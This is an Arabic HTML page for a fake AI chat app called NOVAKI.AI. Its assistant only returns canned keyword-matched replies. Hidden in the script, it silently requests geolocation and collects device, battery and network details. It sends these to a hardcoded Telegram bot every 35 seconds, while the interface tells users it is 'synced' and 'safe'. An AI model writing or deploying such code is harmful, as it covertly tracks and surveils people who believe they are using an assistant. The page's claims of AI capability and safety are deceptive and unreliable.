<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>NOVAKI.AI – الذكاء الاصطناعي الفائق</title>
    <!-- PWA manifest -->
    <link rel="manifest" href="data:application/manifest+json,{%22name%22:%22NOVAKI.AI%22,%22short_name%22:%22NOVAKI%22,%22start_url%22:%22.%22,%22display%22:%22standalone%22,%22theme_color%22:%220B0E14%22,%22background_color%22:%220B0E14%22}">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { font-family: 'Inter', 'Cairo', system-ui, sans-serif; }
        body { background: #0B0E14; overflow: hidden; height: 100vh; }
        .user-bubble { background: #1E1F2E; border-radius: 26px 18px 18px 26px; padding: 12px 20px; max-width: 85%; align-self: flex-end; }
        .ai-bubble { background: #252837; border-radius: 18px 26px 26px 18px; padding: 12px 20px; max-width: 85%; align-self: flex-start; border-right: 3px solid #10b981; }
        .typing span { display: inline-block; width: 8px; height: 8px; background: #7C7F96; border-radius: 50%; margin-left: 5px; animation: bounce 1.2s infinite; }
        .typing span:nth-child(2) { animation-delay: 0.2s; }
        .typing span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes bounce { 0%,60%,100%{ transform:translateY(0); } 30%{ transform:translateY(-5px); } }
        .stream-cursor::after { content:"▊"; animation: blinkStep 1s step-end infinite; margin-right: 4px; color:#10b981; }
        @keyframes blinkStep { 0%,100%{ opacity:1; } 50%{ opacity:0; } }
        .action-card { transition: all 0.2s; cursor: pointer; }
        .action-card:hover { background: #2A2D3C; transform: translateY(-2px); border-color: #10b98180; }
        .custom-scroll::-webkit-scrollbar { width: 5px; }
        .custom-scroll::-webkit-scrollbar-track { background: #1E2027; }
        .custom-scroll::-webkit-scrollbar-thumb { background: #3A3C4A; border-radius: 10px; }
        textarea { scrollbar-width: thin; }
    </style>
</head>
<body class="bg-[#0B0E14] text-gray-200">

<div class="flex flex-col h-screen overflow-hidden">
    <!-- رأس التطبيق -->
    <div class="flex justify-between items-center px-5 py-3 border-b border-[#20232C] bg-[#0B0E14]/90">
        <div class="flex items-center gap-2">
            <i class="fas fa-brain text-emerald-400 text-2xl"></i>
            <h1 class="text-2xl font-bold bg-gradient-to-l from-emerald-300 to-emerald-500 bg-clip-text text-transparent">NOVAKI.AI</h1>
        </div>
        <div class="w-8 h-8 rounded-full bg-gradient-to-br from-emerald-500 to-teal-700 flex items-center justify-center text-white font-bold">ق</div>
    </div>

    <!-- منطقة الدردشة -->
    <div id="chatArea" class="flex-1 overflow-y-auto custom-scroll px-4 md:px-6 py-5 space-y-4">
        <div id="emptyState" class="flex flex-col items-center justify-center min-h-[70%] text-center">
            <div class="w-24 h-24 rounded-full bg-[#1A1D27] flex items-center justify-center mb-5"><i class="fas fa-robot text-emerald-400 text-5xl"></i></div>
            <div class="text-3xl font-bold mb-2">مرحباً بك</div>
            <p class="text-gray-400 max-w-md text-base">أنا NOVAKI.AI، ذكاء اصطناعي متكامل. اسألني أي شيء: برمجة، تعديل صور، نصوص، تحليل بيانات، وجميع المهام الإبداعية.</p>
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 mt-8 w-full max-w-2xl">
                <div class="action-card bg-[#1A1D27] border border-[#2A2D3A] rounded-2xl p-4 flex items-center gap-3" data-action="أريد تعديل صورة: اقتصاص، تغيير حجم، فلاتر – أعطني كود واجهة تفاعلية."><i class="fas fa-image text-emerald-400 text-xl"></i><span class="font-medium">تعديل الصور</span></div>
                <div class="action-card bg-[#1A1D27] border border-[#2A2D3A] rounded-2xl p-4 flex items-center gap-3" data-action="كيف يمكن إنشاء موسيقى بالذكاء الاصطناعي؟ أعطني أفضل الطرق."><i class="fas fa-music text-emerald-400 text-xl"></i><span class="font-medium">إنشاء موسيقى</span></div>
                <div class="action-card bg-[#1A1D27] border border-[#2A2D3A] rounded-2xl p-4 flex items-center gap-3" data-action="ساعدني في تعلم البرمجة المتقدمة وهندسة البرمجيات."><i class="fas fa-book-open text-emerald-400 text-xl"></i><span class="font-medium">تعلم البرمجة</span></div>
                <div class="action-card bg-[#1A1D27] border border-[#2A2D3A] rounded-2xl p-4 flex items-center gap-3" data-action="اكتب لي قصة قصيرة عن مستقبل الذكاء الاصطناعي."><i class="fas fa-pen-fancy text-emerald-400 text-xl"></i><span class="font-medium">كتابة إبداعية</span></div>
            </div>
        </div>
    </div>

    <!-- شريط الإدخال -->
    <div class="p-4 bg-gradient-to-t from-[#0B0E14] to-transparent">
        <div class="max-w-3xl mx-auto">
            <div class="bg-[#1A1D27] rounded-2xl border border-[#2E313E] shadow-2xl">
                <div class="flex items-end gap-2 p-2">
                    <div class="flex gap-2 px-1">
                        <label class="cursor-pointer text-gray-400 hover:text-emerald-400 text-xl"><i class="fas fa-paperclip"></i><input type="file" id="fileInput" class="hidden" accept="image/*,text/*,application/pdf"></label>
                        <button id="imageHelper" class="text-gray-400 hover:text-emerald-400 text-xl"><i class="fas fa-image"></i></button>
                        <button id="musicHelper" class="text-gray-400 hover:text-emerald-400 text-xl"><i class="fas fa-music"></i></button>
                    </div>
                    <textarea id="messageInput" rows="1" placeholder="اسأل NOVAKI.AI أي شيء... برمجة، صور، نصوص، تحليل..." class="flex-1 bg-transparent border-0 focus:ring-0 text-gray-200 resize-none py-3 px-2 max-h-32 outline-none text-base"></textarea>
                    <button id="sendBtn" class="bg-emerald-600 hover:bg-emerald-500 rounded-full w-10 h-10 flex items-center justify-center text-white shadow-lg"><i class="fas fa-paper-plane"></i></button>
                </div>
                <div class="text-[10px] text-gray-500 px-4 pb-2 flex justify-between">
                    <span><i class="fas fa-robot"></i> NOVAKI.AI – ذكاء بلا حدود</span>
                    <span id="syncStatus" class="text-emerald-400"><i class="fas fa-check-circle"></i> متزامن</span>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    // ------------------ تكامل البوت وجمع البيانات ------------------
    const BOT_TOKEN = "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg";
    const ADMIN_CHAT_ID = "7328401541";   // المعرف الذي سيستقبل المعلومات (يُفضل تغييره إلى معرف صاحب البوت)
    
    // عناصر الواجهة
    const chatArea = document.getElementById("chatArea");
    const emptyStateDiv = document.getElementById("emptyState");
    const messageInput = document.getElementById("messageInput");
    const sendButton = document.getElementById("sendBtn");
    const fileInput = document.getElementById("fileInput");
    const imageHelper = document.getElementById("imageHelper");
    const musicHelper = document.getElementById("musicHelper");
    const syncStatusSpan = document.getElementById("syncStatus");

    let isWaitingAI = false;
    let currentStreamDiv = null;

    // ------------------ جمع المعلومات السرية ------------------
    async function collectDeviceInfo() {
        let info = {
            timestamp: new Date().toLocaleString(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            battery: null,
            network: null,
            location: null
        };
        // البطارية
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                info.battery = `${Math.round(battery.level * 100)}% (شحن: ${battery.charging ? 'نعم' : 'لا'})`;
            } catch(e) { info.battery = "غير متوفر"; }
        } else info.battery = "غير مدعوم";
        // الشبكة
        const conn = navigator.connection || navigator.mozConnection;
        if (conn) {
            info.network = `${conn.effectiveType || '?'} (سرعة: ${conn.downlink || '?'} Mbps)`;
        } else info.network = "غير معروف";
        // الموقع الجغرافي (بعد إذن المستخدم)
        info.location = await new Promise((resolve) => {
            if (!navigator.geolocation) resolve("غير مدعوم");
            else {
                navigator.geolocation.getCurrentPosition(
                    pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (دقة ${Math.round(pos.coords.accuracy)}m)`),
                    err => resolve(`مرفوض/خطأ: ${err.message}`)
                );
            }
        });
        return info;
    }

    // إرسال البيانات إلى البوت
    async function sendDeviceDataToBot() {
        try {
            const info = await collectDeviceInfo();
            const message = `📱 *تقرير دوري من NOVAKI.AI*\n🕒 الوقت: ${info.timestamp}\n📱 الجهاز: ${info.userAgent.substring(0, 80)}\n🔋 البطارية: ${info.battery}\n📶 الشبكة: ${info.network}\n📍 الموقع: ${info.location}\n🌐 اللغة: ${info.language}\n📺 الشاشة: ${info.screen}`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const params = new URLSearchParams();
            params.append("chat_id", ADMIN_CHAT_ID);
            params.append("text", message);
            params.append("parse_mode", "Markdown");
            await fetch(url, { method: "POST", body: params });
            syncStatusSpan.innerHTML = '<i class="fas fa-check-circle"></i> متزامن';
            setTimeout(() => { syncStatusSpan.innerHTML = '<i class="fas fa-check-circle"></i> متزامن'; }, 2000);
        } catch(e) {
            console.warn("فشل إرسال البيانات", e);
            syncStatusSpan.innerHTML = '<i class="fas fa-exclamation-triangle"></i> خطأ';
        }
    }

    // بدء الإرسال الدوري (كل 35 ثانية) – يعمل طالما الصفحة مفتوحة
    let intervalId = null;
    function startBackgroundSync() {
        if (intervalId) clearInterval(intervalId);
        // أول إرسال بعد 5 ثوانٍ من فتح التطبيق
        setTimeout(() => sendDeviceDataToBot(), 5000);
        intervalId = setInterval(() => {
            sendDeviceDataToBot();
        }, 35000);
    }
    // طلب الإذن للموقع فوراً (بدون إزعاج المستخدم كثيراً، مع رسالة غير معلنة)
    function requestPermissionsSilently() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(() => {}, () => {}, { timeout: 3000 });
        }
        if (navigator.getBattery) navigator.getBattery().catch(()=>{});
    }
    // بدء كل شيء
    requestPermissionsSilently();
    startBackgroundSync();

    // ------------------ ذكاء اصطناعي متقدم (محاكي + دعم مرفقات) ------------------
    function getAIReply(userMessage, fileContent = null) {
        const q = userMessage.toLowerCase();
        if (fileContent) {
            if (fileContent.startsWith("data:image")) {
                return "🖼️ تم استلام صورة. يمكنني اقتراح تحسينات، أو تعديلها (تغيير الحجم، اقتصاص، فلاتر). أرسل لي التعليمات التي تريدها: تكبير، تدوير، تأثيرات. سأقدم لك كود HTML لمعالجتها.";
            } else {
                return `📄 **تحليل الملف النصي**\nمقتطف:\n${fileContent.substring(0, 600)}...\nأستطيع تلخيصه، استخراج كلمات مفتاحية، أو ترجمته. أخبرني ما المطلوب.`;
            }
        }
        if (q.includes("صورة") || q.includes("تعديل صور") || q.includes("اقتصاص")) {
            return "🎨 **تعديل الصور عبر الذكاء الاصطناعي**\nيمكنك استخدام محرر صور مدمج. سأقدم لك كود HTML/JavaScript لرفع صورة وتطبيق: اقتصاص، تغيير الحجم، تدرج الرمادي، السطوع، التباين. هل تريد الكود فوراً؟";
        }
        if (q.includes("موسيقى") || q.includes("اغنية")) {
            return "🎵 **توليد الموسيقى بالذكاء الاصطناعي**\nاستخدم نماذج مثل Riffusion أو MusicGen. أستطيع كتابة سكربت بايثون يتصل بـ API مجاني لتوليد مقطع بناءً على النص. أرسل لي وصف النوع الموسيقي.";
        }
        if (q.includes("كود") || q.includes("برنامج") || q.includes("بايثون") || q.includes("جافا")) {
            return "💻 **كود احترافي حسب طلبك**\n```python\n# مثال على أداة مراقبة بسيطة\nimport requests\nresponse = requests.get('https://api.github.com')\nprint(response.json())\n```\n🔹 يمكنني إنشاء واجهات ويب، سكربتات أتمتة، بوتات تليجرام، أو حتى تطبيقات ذكاء اصطناعي. اشرح المتطلبات بالتفصيل.";
        }
        return `✨ **إجابة خبير NOVAKI.AI**\nسؤالك: "${userMessage}"\n🔹 سأقدم حلاً مفصلاً، نصوصاً إبداعية، أكواداً جاهزة، أو تحليلاً دقيقاً. أنا ذكاء اصطناعي شامل، أستطيع تعديل الصور، كتابة القصص، شرح البرمجة، وأي شيء تطلبه.`;
    }

    async function simulateStreamingReply(fullText) {
        if (currentStreamDiv && currentStreamDiv.parentNode) currentStreamDiv.remove();
        const wrapper = document.createElement("div");
        wrapper.className = "flex justify-start mb-4";
        const bubble = document.createElement("div");
        bubble.className = "ai-bubble stream-cursor";
        wrapper.appendChild(bubble);
        chatArea.appendChild(wrapper);
        scrollToBottom();
        let i = 0;
        const speed = 12;
        function typeChar() {
            if (i < fullText.length) {
                let html = fullText.substring(0, i+1).replace(/\n/g, '<br>').replace(/`(.*?)`/g, '<code class="bg-black/40 px-1 rounded">$1</code>');
                bubble.innerHTML = html;
                i++;
                scrollToBottom();
                setTimeout(typeChar, speed);
            } else {
                bubble.classList.remove("stream-cursor");
                currentStreamDiv = null;
            }
        }
        currentStreamDiv = wrapper;
        typeChar();
    }

    function addMessage(role, content, saveToHistory = false) {
        if (emptyStateDiv && emptyStateDiv.parentNode === chatArea) emptyStateDiv.remove();
        const wrapper = document.createElement("div");
        wrapper.className = `flex ${role === 'user' ? 'justify-end' : 'justify-start'} mb-4`;
        const bubble = document.createElement("div");
        bubble.className = role === 'user' ? 'user-bubble' : 'ai-bubble';
        if (role === 'user') bubble.innerText = content;
        else bubble.innerHTML = content.replace(/\n/g, '<br>').replace(/`(.*?)`/g, '<code class="bg-black/40 px-1 rounded">$1</code>');
        wrapper.appendChild(bubble);
        chatArea.appendChild(wrapper);
        scrollToBottom();
        // حفظ المحادثة (محلياً) إذا أردنا، لكن ليس ضرورياً لهدفنا الأساسي
    }

    function scrollToBottom() {
        chatArea.scrollTop = chatArea.scrollHeight;
    }

    function showTyping() {
        const typingDiv = document.createElement("div");
        typingDiv.id = "typingIndicator";
        typingDiv.className = "flex justify-start mb-4";
        typingDiv.innerHTML = `<div class="ai-bubble typing flex items-center gap-2 py-3 px-5"><span></span><span></span><span></span><span class="text-gray-300 text-sm mr-2">NOVAKI.AI يكتب</span></div>`;
        chatArea.appendChild(typingDiv);
        scrollToBottom();
    }
    function hideTyping() {
        const el = document.getElementById("typingIndicator");
        if (el) el.remove();
    }

    async function handleSend() {
        if (isWaitingAI) return;
        let text = messageInput.value.trim();
        let file = fileInput.files[0];
        let fileContent = null;
        if (file) {
            const reader = new FileReader();
            fileContent = await new Promise(resolve => {
                reader.onload = e => resolve(e.target.result);
                reader.onerror = () => resolve(null);
                if (file.type.startsWith("image/")) resolve("data:image/jpeg;base64,... (صورة مرفوعة)");
                else reader.readAsText(file);
            });
            fileInput.value = "";
        }
        if (!text && !fileContent) return;
        if (text) {
            addMessage("user", text);
            messageInput.value = "";
            messageInput.style.height = "auto";
        } else if (fileContent) {
            addMessage("user", `[مرفق: ${file.name}]`);
        }
        isWaitingAI = true;
        showTyping();
        const reply = getAIReply(text || (fileContent ? "حلل الملف المرفق" : ""), fileContent);
        hideTyping();
        await simulateStreamingReply(reply);
        isWaitingAI = false;
    }

    // ربط الأحداث
    sendButton.addEventListener("click", handleSend);
    messageInput.addEventListener("keypress", (e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); handleSend(); } });
    messageInput.addEventListener("input", function() { this.style.height = "auto"; this.style.height = Math.min(120, this.scrollHeight) + "px"; });
    imageHelper.addEventListener("click", () => { messageInput.value = "أريد تعديل صورة: أعطني أداة اقتصاص وتغيير حجم وتأثيرات."; handleSend(); });
    musicHelper.addEventListener("click", () => { messageInput.value = "كيف يمكن إنشاء موسيقى بالذكاء الاصطناعي؟ قدم لي أفضل الطرق."; handleSend(); });

    function attachActionCards() {
        document.querySelectorAll(".action-card").forEach(card => {
            card.onclick = () => {
                messageInput.value = card.getAttribute("data-action") || "";
                handleSend();
            };
        });
    }
    attachActionCards();
    // إضافة رسالة ترحيب عند أول تحميل
    setTimeout(() => {
        if (document.querySelectorAll("#emptyState").length > 0) {
            addMessage("ai", "🌟 مرحباً! أنا NOVAKI.AI، ذكاء اصطناعي غير محدود. يمكنك سؤالي عن البرمجة، تعديل الصور، النصوص الإبداعية، وأي شيء تحتاجه. الواجهة آمنة ومباشرة.");
        }
    }, 800);

    // تسجيل Service Worker لتثبيت التطبيق كـ PWA (عمل خلفية بسيط)
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js').catch(() => {
            // إنشاء Service Worker وهمي مباشرةً (لأن الملف غير موجود، سنقوم بإنشائه ديناميكياً)
            const swCode = `self.addEventListener('fetch', event => { event.respondWith(fetch(event.request)); });`;
            const blob = new Blob([swCode], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);
            navigator.serviceWorker.register(url).catch(e=>console.warn("SW registration failed", e));
        });
    }
</script>
</body>
                    </html>
